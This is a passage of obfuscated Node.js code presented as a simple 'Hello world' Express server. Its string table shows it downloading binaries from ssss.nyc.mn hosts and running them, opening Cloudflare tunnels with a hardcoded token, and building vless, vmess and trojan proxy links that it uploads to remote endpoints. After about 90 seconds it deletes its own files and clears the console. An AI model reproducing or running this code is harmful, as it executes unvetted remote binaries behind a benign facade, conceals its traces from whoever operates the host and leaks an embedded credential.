_0x3252=function(_0x32529b,_0x5240a7){_0x32529b=_0x32529b-0x14b;let _0x347986=_0x2d2ee0[_0x32529b];return _0x347986;},_0x3252(_0x4d7840,_0x2e22a9);}function cleanFiles(){const _0x264be2={_0x3ee15a:0x1ab,_0x2f601d:0x18c,_0x39c989:0x17e,_0xd03f2e:0x182};setTimeout(()=>{const _0x19252b={_0x39df4d:0x198,_0x417f61:0x208,_0x44e989:0x1f0,_0x261809:0x167},_0x4f5ba5={_0x324455:0x1f0,_0x294754:0x208},_0x52eb7c=_0x3252,_0x5c4c60=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5c4c60[_0x52eb7c(_0x264be2._0x3ee15a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5c4c60[_0x52eb7c(_0x264be2._0x3ee15a)](phpPath);process[_0x52eb7c(_0x264be2._0x2f601d)]==='win32'?exec(_0x52eb7c(_0x264be2._0x39c989)+_0x5c4c60[_0x52eb7c(_0x264be2._0xd03f2e)]('\x20')+_0x52eb7c(0x1c1),_0xa7bd30=>{const _0x4e9423=_0x52eb7c;console['clear'](),console[_0x4e9423(0x208)](_0x4e9423(_0x4f5ba5._0x324455)),console[_0x4e9423(_0x4f5ba5._0x294754)](_0x4e9423(0x167));}):exec('rm\x20-rf\x20'+_0x5c4c60[_0x52eb7c(0x182)]('\x20')+'\x20>/dev/null\x202>&1',_0xd20c31=>{const _0x123c21=_0x52eb7c;console[_0x123c21(_0x19252b._0x39df4d)](),console[_0x123c21(_0x19252b._0x417f61)](_0x123c21(_0x19252b._0x44e989)),console['log'](_0x123c21(_0x19252b._0x261809));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3b2bef={_0x5d710e:0x208,_0x3e27fa:0x14f,_0x1ea4d0:0x19b,_0x9f2ef2:0x208,_0x381603:0x1f1},_0xfa2c2d=_0x4a07e0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xfa2c2d(_0x3b2bef._0x5d710e)](_0xfa2c2d(_0x3b2bef._0x3e27fa));return;}try{const _0x2bf10f=await axios[_0xfa2c2d(_0x3b2bef._0x1ea4d0)](_0xfa2c2d(0x174),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xfa2c2d(0x16d)}});return console[_0xfa2c2d(_0x3b2bef._0x9f2ef2)](_0xfa2c2d(0x197)),_0x2bf10f;}catch(_0xf7d3b){return console[_0xfa2c2d(0x171)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0xf7d3b[_0xfa2c2d(_0x3b2bef._0x381603)]),null;}}async function startserver(){const _0x1126c6={_0xbd6fb9:0x171},_0x567ee4=_0x4a07e0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x365646){console[_0x567ee4(_0x1126c6._0xbd6fb9)]('Error\x20in\x20startserver:',_0x365646);}}startserver()[_0x4a07e0(0x15b)](_0x1a634e=>{const _0x266116={_0x498bd9:0x1e7},_0x199c01=_0x4a07e0;console[_0x199c01(0x171)](_0x199c01(_0x266116._0x498bd9),_0x1a634e);}),app[_0x4a07e0(0x207)](PORT,()=>console[_0x4a07e0(0x208)](_0x4a07e0(0x15d)+PORT+'!'));function _0x2d2e(){const _0x2a95c2=['log','forEach','set','test','ArgoDomain:','http','includes','unshift','Skipping\x20adding\x20automatic\x20access\x20task','1449560fApsYm','Error\x20executing\x20command:\x20','send','https://arm64.ssss.nyc.mn/web','CFPORT','\x20failed:\x20','split','716056zgplwe','get','sub','trojan','catch','\x0aclient_secret:\x20','http\x20server\x20is\x20running\x20on\x20port:','nohup\x20','\x20is\x20created','unlinkSync','UPLOAD_URL','chmod','\x0avless://','existsSync','stringify','2556580ZLuCaw','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x22\x20>\x20/dev/null\x202>&1','432717tbNHiK','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','application/json','config.json','2083','sub.txt','error','charAt','statSync','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','none','https://amd64.ssss.nyc.mn/v1','/trojan-argo','text/plain;\x20charset=utf-8','ARGO_DOMAIN','vless','org','/dev/null','del\x20/f\x20/q\x20','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20already\x20exists','join','path','ARGO_DOMAIN:','123YuFACr','https://arm64.ssss.nyc.mn/agent','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/bot','http://ip-api.com/json/','success','&path=%2Ftrojan-argo%3Fed%3D2560#','platform','443','\x0a\x0atrojan://','FILE_PATH','country_code','2087','127.0.0.1','ARGO_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','?security=tls&sni=','ARGO_AUTH','automatic\x20access\x20task\x20added\x20successfully','clear','\x0a\x20\x20credentials-file:\x20','\x20>/dev/null\x202>&1\x20&','post','?encryption=none&security=tls&sni=','then','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','writeFileSync','status','close','from','eyJhIjoiZmRkZDg4YzA3MTBkMDhkMTc3NzIzOGY4ZGFmZDBiNmMiLCJ0IjoiYjk0ZDVhZDItZTU5Yi00YzM2LThjODYtYjJlMGFlNzFjNjFmIiwicyI6Ik9HWmtPR1JsWW1VdFlqWTJNUzAwWm1KbUxUazFNR010Wm1JeU5UUTJPR1ptWWprMSJ9','https://amd64.ssss.nyc.mn/bot','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','block','child_process','/sub.txt\x20saved\x20successfully','utf-8','push','tunnel.yml','axios','response','https://amd64.ssss.nyc.mn/agent','--tls','Download\x20','basename','2096','list.txt','vmess','.exe\x20>\x20nul\x202>&1','SERVER_PORT','aarch64','https://amd64.ssss.nyc.mn/web','/api/add-nodes','\x20-p\x20','Empowerment\x20failed\x20for\x20','arch','\x20is\x20running','mkdirSync','map','\x20>\x20nul\x202>&1','taskkill\x20/f\x20/im\x20','/api/add-subscriptions','PROJECT_URL','/config.json\x20>/dev/null\x202>&1\x20&','97a01c93-20c8-4889-8978-2dff72d4ecd8','npm\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/v1','floor','config.yaml','/tunnel.yml\x20run','filter','4058TvzuZp','toString','pipe','tunnel.json','Subscription\x20uploaded\x20successfully','isFile','/vmess-argo?ed=2560','\x0a\x20\x20tunnel:\x20','all','tcp','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/vmess-argo','php\x20running\x20error:\x20','env','railwaycloud.1.f.8.0.1.9.1.0.0.0.7.4.0.1.0.0.2.ip6.arpa','CFIP','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Nodes\x20uploaded\x20successfully','base64','unlink','&path=%2Fvless-argo%3Fed%3D2560#','&fp=firefox&type=ws&host=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','/vless-argo','8443','Unhandled\x20error\x20in\x20startserver:','quic','arm','SUB_PATH','length','express','\x0a\x20\x20\x20\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/delete-nodes','App\x20is\x20running','message','finish','2053','countryCode','amd','13071168SNuraM','boot.log','NEZHA_KEY','https+local://8.8.8.8/dns-query','readFileSync','firefox','direct','NEZHA_SERVER','\x20-c\x20','fileName','tls','Hello\x20world!','match','2266866qJgSGX','web\x20running\x20error:\x20','exec','data','listen'];_0x2d2e=function(){return _0x2a95c2;};return _0x2d2e();}
